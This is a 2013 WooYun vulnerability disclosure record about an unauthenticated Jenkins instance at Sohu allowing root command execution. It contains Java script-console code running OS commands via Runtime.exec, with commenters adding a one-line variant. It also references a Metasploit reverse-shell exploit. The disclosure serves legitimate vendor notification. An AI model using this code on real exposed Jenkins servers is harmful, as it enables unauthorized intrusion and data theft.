{"id": 12032, "wybug_id": "wooyun-2013-023234", "wybug_title": "搜狐某系统为授权访问，致任意命令执行，用户和业务数据可被泄露，威胁内网。", "wybug_corp": "搜狐", "wybug_author": "stephanie", "wybug_date": "2013-05-07 17:25", "wybug_open_date": "2013-06-21 17:25", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-05-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-05-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-05-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-05-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-06-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-06-21：\t细节向公众公开  简要描述： 百合忽略漏洞，这个名字起的牛b点。。。主要是某系统为授权可访问，导致可执行任意命令，权限还是root，数据库未做访问限制,数据量很蛮大的。。 详细说明：  此问题是由于他们使用了这个Jenkins系统。而且没有做访问控制。那Jenkins是基于Java开发的一种持续集成工具，用于监控秩序重复的工作，如果配置不当，可以发安全问题。为授权访问可以造成任意命令执行威胁，metasploit利用可以获得一个反向的shell具体看http://www.exploit-db.com/exploits/24272/。当然，假如我们没有一个可以反向连接回来的机器，也可以在其脚本命令行处运行java代码来执行任意命令。利用代码如下：\nRuntime runtime = Runtime.getRuntime();    Process process = runtime.exec(\"id\");    process.getInputStream();     BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));    String inline;    String returnvalue = \"\";    while ((inline = br.readLine()) != null) {       returnvalue +=( inline );    }    br.close();    out.println(returnvalue);\n那后面可以干啥，大家就自己脑补吧。   漏洞证明：  \n\n\n\n\n\n\n\n   修复方案：     版权声明：转载请注明来源 stephanie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-05-07 17:58 厂商回复： 已通知业务线进行处理，感谢对搜狐安全的关注。请把IP地址及邮箱地址打下码。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n          这些评论似乎很乌云~~~思密达          2013-05-17 19:27 |\t\t\t\t\tloopx9 \t\t\t( 核心白帽子 |\t\t\t\t\t\tRank:602 漏洞数:59\t\t\t| ..)\t\t\t\t\t\t\t\n  执行回显其实可以直接一句话就搞定java.lang.Runtime.getRuntime().exec('id').getText();    \n   \n \n     2013-05-07 17:26 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  这标题，重金属!    \n     2013-05-07 19:28 |    \t\tiiiiiiiii \t\t\t( 普通白帽子  |\t\t\t        Rank:680 漏洞数:89        | )\t\t \n  ..    \n     2013-05-08 09:24 |    \t\tmomo \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:24        | ★精华漏洞数:24 | WooYun认证√)\t\t \n  给力啊。这样的错误。    \n     2013-05-17 19:27 |    \t\tloopx9 \t\t\t( 核心白帽子 |\t\t\t        Rank:602 漏洞数:59        | ..)\t\t \n  执行回显其实可以直接一句话就搞定java.lang.Runtime.getRuntime().exec('id').getText();    \n     2013-06-06 18:02 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @loopx9 技巧帝    \n     2013-06-21 19:33 |    \t\txiaoxin \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:9        | 无)\t\t \n  @loopx9 @疯狗 哪个版本的api，竟然有getText()方法，我的jdk7.0都没有    \n     2013-06-21 19:41 |    \t\tloopx9 \t\t\t( 核心白帽子 |\t\t\t        Rank:602 漏洞数:59        | ..)\t\t \n  @xiaoxin 不是jdk的，jenkins(hudson)自带的    \n     2013-06-22 12:42 |    \t\txiaoxin \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:9        | 无)\t\t \n  @loopx9 谢谢    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}